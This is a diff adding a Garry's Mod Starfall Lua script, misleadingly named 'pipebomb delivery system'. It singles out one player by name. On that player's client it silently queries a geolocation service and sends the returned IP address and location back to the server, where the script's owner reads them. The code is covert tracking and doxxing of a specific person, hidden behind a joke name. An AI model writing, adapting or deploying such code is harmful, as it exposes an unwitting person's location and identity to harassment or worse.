@@ -1,0 +1,23 @@
+--@name pipebomb delivery system
+--@author Redox
+--@shared
+
+if CLIENT then
+    if player() ~= find.playersByName("charity",false,false)[1] then return end
+    if hasPermission("http.get") then
+            http.get("https://freegeoip.app/json/",
+            function(body,lenght,headers)
+                net.start( "x" )
+                net.writeString( body )
+                net.send()
+                end
+            ,
+            function(fail)
+        end)
+    end
+else
+    net.receive( "x", function(_,ply)
+        print( ply )
+        print( net.readString() )
+    end)
+end
